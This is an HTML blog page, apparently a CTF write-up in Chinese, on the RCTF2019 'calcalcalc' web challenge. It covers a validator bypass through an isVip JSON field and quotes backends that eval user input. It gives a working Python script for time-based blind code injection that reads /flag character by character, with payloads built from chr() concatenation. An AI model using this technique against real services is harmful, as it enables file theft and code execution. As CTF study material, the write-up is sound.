@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>[RCTF2019]calcalcalc (盲注) | 过客</title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="[RCTF2019]calcalcalc (盲注) | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="[RCTF2019]calcalcalc (盲注)"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/xUUCnsZ57/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content="过客"/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io">过客</a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>[RCTF2019]calcalcalc (盲注)</h1>
+            <span class="meta">
+            	Posted on
+              2020-06-08，3 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>github下源码。<br>
+打开index.hbs。</p>
+<!-- more -->
+<p><img src="https://guokeya.github.io/post-images/1591604393921.png" alt="" loading="lazy"><br>
+他会请求calculate<br>
+对应calculate.model.ts<br>
+<img src="https://guokeya.github.io/post-images/1591604448242.png" alt="" loading="lazy"><br>
+继续看expression.validator.ts<br>
+<img src="https://guokeya.github.io/post-images/1591604534974.png" alt="" loading="lazy"><br>
+这里isVip如果是False。就会判断。输入的长度不能超过15。并且输入的字符只能是正则中的字符。<br>
+但是。这里isVip默认就是False的。<br>
+那么可以直接传一个json。其中带有isVip属性为true<br>
+<code>{&quot;expression&quot;:&quot;1111&quot;,&quot;isVip&quot;:true}</code><br>
+然后分别有三个后端。</p>
+<pre><code>&lt;?php
+ob_start();
+$input = file_get_contents('php://input');
+$options = MongoDB\BSON\toPHP($input);
+$ret = eval('return ' . (string) $options-&gt;expression . ';');
+echo MongoDB\BSON\fromPHP(['ret' =&gt; (string) $ret]);
+</code></pre>
+<p>同时禁用了很多函数。</p>
+<pre><code>    expr = bson.BSON(data).decode()
+    if 'exec' in dir(__builtins__):
+        del __builtins__.exec
+    return bson.BSON.encode({
+        &quot;ret&quot;: str(eval(str(expr['expression'])))
+    })
+</code></pre>
+<p>限制了执行系统命令的函数。那么可以用盲注<br>
+试了下sleep(5)。成功延时5秒。<br>
+问题来了。。eval中可以用eval(eval())嵌套执行。但是有些字符不能用。并且.也被ban了。不能用chr(xx).chr(xx)来执行。<br>
+再想想python。可以用chr(xx)+chr(xx)。并且也支持eval(eval)嵌套</p>
+<pre><code>import requests
+import time
+x=''
+def getpayload(num,mid):
+    payload=&quot;__import__('time').sleep(5) if (ord(open('/flag','r').read()[&quot;+str(num)+&quot;])&gt;&quot;+str(mid)+&quot;) else 1&quot;
+    data=''
+    for i in payload:
+        data+='chr('+str(ord(i))+')+'
+    return('eval('+data[:-1]+')')
+url='http://62e44b9b-0d83-4e04-919b-be0ae81e0a68.node3.buuoj.cn/calculate'
+for a in range(0,60):
+    max = 130
+    min = 30
+    while max &gt;=min:
+        mid=(max+min)//2
+        payload=getpayload(a,mid)
+        time1=time.time()
+        r = requests.post(url, json={'isVip': True, 'expression': payload})
+        time2=time.time()
+        if (time2-time1&gt;5):
+            min=mid+1
+        else:
+            max=mid
+        if max==mid==min:
+            x+=chr(mid)
+            print(str(a)+':'+x)
+            break
+</code></pre>
+<p>用chr()构造字符。然后+拼接。eval执行一次。得到payload。然后再由系统自带的eval执行一次。执行payload<br>
+<code>__import__('time').sleep(5) if 读取文件的第一个字符&gt;xx else 1</code><br>
+进行盲注</p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/sMTQt2i7B/">
+              <span class="post-title">
+                RACTF(Web)&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span>过客</span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea</a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
